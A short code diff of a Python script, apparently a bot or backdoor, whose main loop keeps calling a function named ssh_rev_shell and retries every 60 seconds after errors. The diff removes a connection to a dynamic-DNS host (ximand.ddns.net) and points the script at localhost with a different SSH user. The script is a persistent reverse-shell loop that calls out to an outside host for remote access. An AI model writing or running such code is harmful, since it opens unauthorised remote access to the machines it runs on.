@@ -227,16 +227,16 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 if __name__ == "__main__":
 
     auth_path = os.path.join(parent_dir, 'mechanism')
-    host = dns_resolution('ximand.ddns.net')
+    
+    host = "localhost"
 
     
     while True:
         try:
-            ssh_rev_shell(host, 'ubuntu', auth_path, user, 64000)
+            ssh_rev_shell(host, 'counter', auth_path, user, 64000)
         except Exception as e:
             time.sleep(60)
             pass
 
         
         time.sleep(0.5)
-
